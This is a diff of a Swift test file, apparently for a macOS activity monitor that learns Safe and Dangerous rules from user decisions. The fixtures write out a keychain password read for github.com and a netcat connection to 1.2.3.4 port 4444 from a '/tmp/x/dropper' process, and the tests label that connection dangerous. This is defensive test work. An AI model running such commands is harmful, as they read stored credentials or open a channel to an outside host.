@@ -19,6 +19,14 @@ import Testing
     @discardableResult
     func seen(_ e: ActivityEvent) -> String { store.observe(e); return e.signatureKey }
 
+    /// The pattern made regular behaviour: seen 6 times over two hours (Safe rules are learned only from those).
+    func makeRegular(_ key: String) {
+        guard var e = store.entry(key) else { return }
+        e.count = 6
+        e.firstSeen = Date().addingTimeInterval(-7200)
+        store.restore(e)
+    }
+
     func keychainRead(parent: String) -> ActivityEvent {
         exec("/usr/bin/security", pid: Int.random(in: 1000...9999), ppid: 1, parent: parent,
              args: "security find-internet-password -s github.com -w")
@@ -40,12 +48,37 @@ import Testing
 
     @Test func proposalIsCheckedAgainstYourDecisions() {
         let a = seen(keychainRead(parent: git))
+        makeRegular(a)
         store.set(.safe, keys: [a])                                         // your decision
         seen(keychainRead(parent: "/opt/homebrew/Cellar/git/2.55.0/libexec/git-core/git-credential-osxkeychain"))
         let e = RuleEvaluation.evaluate(gitRule, entries: store.allEntries)
         #expect(e.approvable)
         #expect(e.agreeing == [a])
         #expect(e.totalMatches >= 1)
+    }
+
+    /// A Safe rule stops questions for good: never from patterns seen a few times; Dangerous ones may be one-offs.
+    @Test func safeRulesNeedRegularBehaviour() {
+        let once = seen(keychainRead(parent: git))
+        store.set(.safe, keys: [once])
+        let e = RuleEvaluation.evaluate(gitRule, entries: store.allEntries)
+        #expect(!e.approvable && e.problems.contains { $0.contains("regular behaviour") })
+        // Five times within a minute (a loop) is still not regular; over two hours it is.
+        guard var entry = store.entry(once) else { Issue.record("no entry"); return }
+        entry.count = 50
+        entry.firstSeen = entry.lastSeen.addingTimeInterval(-30)
+        store.restore(entry)
+        #expect(!RuleEvaluation.evaluate(gitRule, entries: store.allEntries).approvable)
+        makeRegular(once)
+        #expect(RuleEvaluation.evaluate(gitRule, entries: store.allEntries).approvable)
+        // What Claude learns from: one-off Safe decisions left out, one-off Dangerous ones kept.
+        let book = RuleBook(store: store, fileURL: dir.appendingPathComponent("rules.json"))
+        let oneOffSafe = seen(exec("/usr/bin/zip", pid: 7, ppid: 1, parent: "/Applications/Archiver.app/Contents/MacOS/Archiver", args: "zip -r a.zip b"))
+        let oneOffBad = seen(exec("/usr/bin/nc", pid: 8, ppid: 1, parent: "/tmp/x/dropper", args: "nc 1.2.3.4 4444"))
+        store.set(.safe, keys: [oneOffSafe])
+        store.set(.dangerous, keys: [oneOffBad])
+        let taught = Set(book.teachingDecisions.map(\.id))
+        #expect(taught.contains(once) && taught.contains(oneOffBad) && !taught.contains(oneOffSafe))
     }
 
     @Test func conflictingTooBroadAndEmptyRulesAreRefused() {
@@ -83,6 +116,7 @@ import Testing
     @Test func regressionPausesARuleThatStartsContradictingYou() throws {
         let book = RuleBook(store: store, fileURL: dir.appendingPathComponent("rules.json"))
         let a = seen(keychainRead(parent: git))
+        makeRegular(a)
         store.set(.safe, keys: [a])
         let proposal = RuleProposal(rule: gitRule, evaluation: RuleEvaluation.evaluate(gitRule, entries: store.allEntries))
         book.approve(proposal)
